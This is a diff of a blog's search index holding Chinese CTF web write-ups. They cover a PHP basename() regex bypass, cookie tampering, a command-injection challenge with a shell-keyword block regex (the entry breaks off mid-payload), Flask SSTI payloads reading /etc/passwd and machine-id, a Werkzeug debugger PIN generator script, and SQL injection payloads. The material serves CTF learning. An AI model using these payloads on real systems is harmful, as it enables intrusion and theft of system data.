-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><code>$_SERVER[&#39;PHP_SELF&#39;]</code></p>
-<p> -&gt; 获取当前正在执行的脚本的路径中的名字</p>
-<p><code>preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])</code></p>
-<p>-&gt; 正则匹配中 <code>./</code>有特殊含义，用<code>\</code> 来转义   </p>
-<p>&#x3D;&gt; 如果当前目录的最后的脚本的名字是以 <code>config.php/</code>就会匹配成功 返回True</p>
-<p><strong>思路：</strong></p>
-<p>源码中给出了 Flag在config.php，所以我们绕过这个正在匹配，来高亮显示config.php文件 读取flag</p>
-<p>这个源码中下半部分是 </p>
-<p>-&gt; 64位二进制随机数转换成十六进制 后与 POST方法传入的参数  hash值比较</p>
-<p>-&gt; 不知道从这个角度能否下手。</p>
-<p><strong>还是绕过正则：</strong></p>
-<p>这里 <code>basename()</code>函数存在一个问题 &#x3D;&gt; 它会去掉文件名开头中的非ASCII码值</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">basename</span>(<span class="string">&quot;%feconfig.php&quot;</span>)); <span class="comment">// 随便非ASCII码值就可以</span></span><br></pre></td></tr></table></figure>
-
-<p>payload:<code>/index.php/config.php/%fe?source</code></p>
-<h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>初始是50元，先购买前面的 看看有什么信息（根据题目Cookie），通过抓包，发现Cookie是经过base64加密的 且是有一定的格式的。</p>
-<p>我是通过抓包修改Cookie，让剩余的钱数变成大于100后放包，直接买flag的商品</p>
-<p><code>&#123;&quot;money&quot;: 150, &quot;history&quot;: [&quot;Yummy chocolate chip cookie&quot;, &quot;Yummy chocolate chip cookie&quot;, &quot;Yummy chocolate chip cookie&quot;]&#125;</code></p>
-<p>-&gt;这是Cookie的格式，钱数就是 买完之后还有多少钱</p>
-<p>-&gt; history指的是 你的购买记录</p>
-<p>&#x3D;&gt; 抓包修改 money 放包</p>
-<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>这个题看Wp说有源码泄露</p>
-<ul>
-<li><input disabled type="checkbox"> 代码审计</li>
-<li><input disabled type="checkbox"> preg_match()函数的理解</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"><span class="comment"># 这行代码是用来在运行中的shell环境中修改环境变量的. =&gt; 这行代码将PATH环境变量设置为 /home/rceserivice/jail</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;	<span class="comment"># 检查$json变量是不是一个字符串</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>环境变量的概念：</p>
-<p>操作系统用来存储关于系统运行时信息的数据，这些信息可以被操作系统和执行的程序访问。PATH环境变量特别用于查找执行文件（例如程序或脚本）的位置。<strong>当你在Shell中输入一个命令时，操作系统会依次检查PATH变量中列出的目录，直到找到对应的执行文件。</strong></p>
-</blockquote>
-<p>法1： 用换行符（%0A）绕过正则匹配：</p>
-<p>&#96;?cmd&#x3D;</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>Buu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUU-[GYCTF2020]FlaskApp的Wp</title>
-    <url>/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/</url>
-    <content><![CDATA[<h2 id="GYCTF2020-FlaskApp的Wp"><a href="#GYCTF2020-FlaskApp的Wp" class="headerlink" title="[GYCTF2020]FlaskApp的Wp"></a>[GYCTF2020]FlaskApp的Wp</h2><p><strong>计算PIN码的方法（必须知道的值）：</strong></p>
-<blockquote>
-<ol>
-<li>username：就是启动这个flask的用户</li>
-</ol>
-<p>-&gt; <code>etc/passwd</code> 中查看</p>
-<ol start="2">
-<li><p>modname：一般为flask.py</p>
-</li>
-<li><p>getattr(app, “__name__”, app.<strong>class</strong>.<strong>name</strong>)：python该值一般为Flask 值一般不变</p>
-</li>
-<li><p>getattr(mod, ‘file’, None)：为flask目录下的一个app.py的绝对路径（通过报错信息一般回泄露该路径）</p>
-</li>
-<li><p>uuid.getnode()：就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式</p>
-</li>
-</ol>
-<p>-&gt; 通过文件 <code>/sys/class/net/eth0/address</code>获取     # eth0 处为当前使用的网卡</p>
-<ol start="6">
-<li>get_machine_id() ：&#x2F;etc&#x2F;machine-id或者 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i中的值</li>
-</ol>
-<p>-&gt;假如是在win平台下读取不到上面两个文件，就去获取注册表中SOFTWARE\Microsoft\Cryptography的值</p>
-<p>-&gt;假如是Docker机 那么为 &#x2F;proc&#x2F;self&#x2F;cgroup</p>
-</blockquote>
-<p>python shell的一些命令(os 模块)</p>
-<p>import os</p>
-<p>查看当前目录所有文件 <code>os.listdir(&#39;.&#39;)</code></p>
-<p>查看当前目录<code>os.getcwd()</code></p>
-<p>更改目录<code>os.chdir()</code></p>
-<p>打开文件<code>os.popen(&#39;cat filepath&#39;).read()</code></p>
-<p>打开文件<code>exec(open(&#39;filepath&#39;).read())</code> 好像会报错，但是报错中有文件内容</p>
-<p><strong>解题：</strong></p>
-<p>题目是FlaskAPP，打开网址，有提示.</p>
-<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/03.png"></p>
-<p>获取到的信息：Flask 和 PIN（根据要获得PIN的需要知道的数值） -&gt; 读取文件 -&gt;SSTI（Flask）注入读取文件</p>
-<p><strong>SSTI</strong> 要寻找注入点-&gt; 先经过base64加密之后 再进行base64解码 （注入点在base64解码那里）</p>
-<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/04.png"></p>
-<p><strong>Payload：</strong></p>
-<p><strong>1.获取username</strong></p>
-<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/etc/passwd').read()&#125;&#125;</code></p>
-<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/00.png"></p>
-<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/01.png"></p>
-<p>2.获取Mac地址（同上, 转成十进制）</p>
-<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/sys/class/net/eth0/address').read()&#125;&#125;</code></p>
-<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/02.png"></p>
-<p><strong>3.获取机器ID（不止这第一个路径，还有几个其他的，都要试试，我的是这个得到了正确答案）</strong></p>
-<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/etc/machine-id').read()&#125;&#125;</code></p>
-<p><strong>获取PIN的脚本（网上找的）</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;11296411583006&#x27;</span><span class="comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span>, <span class="comment"># get_machine_id(),/etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
-
-
-
-<hr>
-<p>参考：<a href="https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/">https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/</a></p>
 ]]></content>
       <categories>
         <category>Web</category>
@@ -268,65 +262,51 @@
       </tags>
   </entry>
   <entry>
-    <title>BUU-[SWPU2019]Web1的Wp</title>
-    <url>/CTF/Web/BUU-%5BSWPU2019%5DWeb1/</url>
-    <content><![CDATA[<h2 id="SWPU2019-Web1-二次注入题"><a href="#SWPU2019-Web1-二次注入题" class="headerlink" title="[SWPU2019]Web1 二次注入题"></a>[SWPU2019]Web1 二次注入题</h2><p><strong>参考</strong>:<a href="https://blog.csdn.net/satasun/article/details/109391116">https://blog.csdn.net/satasun/article/details/109391116</a></p>
-<hr>
-<p>知识点:</p>
+    <title>BUU平台的Web题记录</title>
+    <url>/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/</url>
+    <content><![CDATA[<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>知识点：</p>
 <ul>
-<li><input disabled type="checkbox"> <a href="https://blog.csdn.net/qq_46091464/article/details/105899269">二次注入</a></li>
-<li><input disabled type="checkbox"> <a href="https://zhuanlan.zhihu.com/p/98206699">无列名注入</a></li>
-<li><input disabled type="checkbox"> <a href="https://www.anquanke.com/post/id/193512">information_schema的过滤</a></li>
+<li>basenmae()函数的问题</li>
+<li>正则匹配的绕过</li>
+<li>代码审计</li>
+<li>PHP预定义的超全局变量</li>
 </ul>
-<hr>
-<h3 id="1-二次注入"><a href="#1-二次注入" class="headerlink" title="1.二次注入"></a>1.二次注入</h3><p><strong>原理</strong></p>
-<p>1.用户向数据库中插入恶意数据（即使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义）</p>
-<p>2.数据库对自己存储的数据非常放心，直接取出恶意数据给用户</p>
-<p><strong>过程</strong></p>
-<p>(1)插入1’#</p>
-<p>(2)转义成了1’\#</p>
-<p>(3)放在数据库中还是1’#</p>
-<p>(4)再取出这些数据时，不会转义 &#x3D;&gt; 取出的是 1’# &#x3D;&gt; 完成注入</p>
-<h3 id="2-无列名注入-—-在不知道列名的情况下进行sql注入"><a href="#2-无列名注入-—-在不知道列名的情况下进行sql注入" class="headerlink" title="2.无列名注入 — 在不知道列名的情况下进行sql注入."></a>2.无列名注入 — 在不知道列名的情况下进行sql注入.</h3><p>在mysql&gt;&#x3D;5的版本中，有一个information_schema的库，里面记录着mysql所有表的结构，在sql注入中，我们会通过这个库来获取其他表的结构（列名，表名）。</p>
-<p><strong>原理</strong></p>
-<p>将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询。</p>
-<p><strong>操作</strong></p>
-<p>1.<code>select * from list;</code></p>
-<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql00.png"></p>
-<p>2.<code>select 1,2,3 union select * from list;</code></p>
-<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql01.png"></p>
-<p>3.select <code>3</code> from (select 1,2,3 union select * from list)a;</p>
-<p>-&gt;末尾的a可以是任意字符，用于命名</p>
-<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql02.png"></p>
-<p>4.<code>select b from (select 1,2,3 as b union select * from list)a;</code></p>
-<p>-&gt;如果过滤了&#96;&#96;反引号，起别名</p>
-<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql03.png"></p>
-<p>5.select concat(<code>2</code>,0x2d,<code>3</code>) from (select 1,2,3 union select * from list)a limit 1,3;</p>
-<p>-&gt;多列查询</p>
-<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql04.png"></p>
-<p>payload: <strong>select a,b from posts where a&#x3D;-1 union select 1,(select concat(<code>3</code>,0x2d,<code>4</code>) from (select 1,2,3,4,5,6 union select * from xxx)a limit 1,1);</strong></p>
-<h3 id="3-bypass-information-schema"><a href="#3-bypass-information-schema" class="headerlink" title="3.bypass information_schema"></a>3.bypass information_schema</h3><p><code>information_schema是什么?</code></p>
-<p>-&gt;保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。</p>
-<p>-&gt;在注入中，infromation_schema库的作用无非就是可以获取到table_schema,table_name,column_name这些数据库内的信息。</p>
-<p><strong>Mysql在5.7版本新增了sys schema 基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。</strong></p>
-<p>sys.schema_auto_increment_columns</p>
-<p>-&gt;对表自增字段的监控.</p>
-<p>-&gt;只要有自增字段，那么就可以通过这个库来查询到 &#x3D;&gt; 代替了information_schema</p>
-<p><strong>前提: 注入的表中存在自增字段</strong></p>
-<p>如果没有呢（下面两个可以代替）</p>
-<p>-&gt;schema_table_statistics_with_buffer</p>
-<p>-&gt;sys.x$schema_table_statistics_with_buffer</p>
-<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>进入网站，随便注册一个账号进入，可以发布广告 &#x3D;&gt; 想到了xss(不是很熟悉,不知道怎么去验证,看wp说是二次注入)</p>
-<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/00.png"></p>
-<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/01.png"></p>
-<p>确定存在sql注入,且为二次注入 过滤了空格,or,注释符</p>
-<p><strong>payload:</strong></p>
-<p>1.<code>1&#39;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></p>
-<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/payload00.png"></p>
-<p>2.<code>1&#39;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&quot;web1&quot;&#39;</code></p>
-<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/payload01.png"></p>
-<p>3.<code>1&#39;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></p>
-<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/payload03.png"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>$_SERVER[&#39;PHP_SELF&#39;]</code></p>
+<p> -&gt; 获取当前正在执行的脚本的路径中的名字</p>
+<p><code>preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])</code></p>
+<p>-&gt; 正则匹配中 <code>./</code>有特殊含义，用<code>\</code> 来转义   </p>
+<p>&#x3D;&gt; 如果当前目录的最后的脚本的名字是以 <code>config.php/</code>就会匹配成功 返回True</p>
+<p><strong>思路：</strong></p>
+<p>源码中给出了 Flag在config.php，所以我们绕过这个正在匹配，来高亮显示config.php文件 读取flag</p>
+<p>这个源码中下半部分是 </p>
+<p>-&gt; 64位二进制随机数转换成十六进制 后与 POST方法传入的参数  hash值比较</p>
+<p>-&gt; 不知道从这个角度能否下手。</p>
+<p><strong>还是绕过正则：</strong></p>
+<p>这里 <code>basename()</code>函数存在一个问题 &#x3D;&gt; 它会去掉文件名开头中的非ASCII码值</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">basename</span>(<span class="string">&quot;%feconfig.php&quot;</span>)); <span class="comment">// 随便非ASCII码值就可以</span></span><br></pre></td></tr></table></figure>
+
+<p>payload:<code>/index.php/config.php/%fe?source</code></p>
+<h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>初始是50元，先购买前面的 看看有什么信息（根据题目Cookie），通过抓包，发现Cookie是经过base64加密的 且是有一定的格式的。</p>
+<p>我是通过抓包修改Cookie，让剩余的钱数变成大于100后放包，直接买flag的商品</p>
+<p><code>&#123;&quot;money&quot;: 150, &quot;history&quot;: [&quot;Yummy chocolate chip cookie&quot;, &quot;Yummy chocolate chip cookie&quot;, &quot;Yummy chocolate chip cookie&quot;]&#125;</code></p>
+<p>-&gt;这是Cookie的格式，钱数就是 买完之后还有多少钱</p>
+<p>-&gt; history指的是 你的购买记录</p>
+<p>&#x3D;&gt; 抓包修改 money 放包</p>
+<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>这个题看Wp说有源码泄露</p>
+<ul>
+<li><input disabled type="checkbox"> 代码审计</li>
+<li><input disabled type="checkbox"> preg_match()函数的理解</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"><span class="comment"># 这行代码是用来在运行中的shell环境中修改环境变量的. =&gt; 这行代码将PATH环境变量设置为 /home/rceserivice/jail</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;	<span class="comment"># 检查$json变量是不是一个字符串</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>环境变量的概念：</p>
+<p>操作系统用来存储关于系统运行时信息的数据，这些信息可以被操作系统和执行的程序访问。PATH环境变量特别用于查找执行文件（例如程序或脚本）的位置。<strong>当你在Shell中输入一个命令时，操作系统会依次检查PATH变量中列出的目录，直到找到对应的执行文件。</strong></p>
+</blockquote>
+<p>法1： 用换行符（%0A）绕过正则匹配：</p>
+<p>&#96;?cmd&#x3D;</p>
 ]]></content>
       <categories>
         <category>Web</category>
@@ -334,40 +314,6 @@
       <tags>
         <tag>Web</tag>
         <tag>Buu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUU-[HDCTF 2023]KEEP ON的Wp</title>
-    <url>/CTF/Pwn/hdctf%E7%9A%84wp/</url>
-    <content><![CDATA[<p><strong>知识点：格式化字符串劫持、<a href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移</a></strong></p>
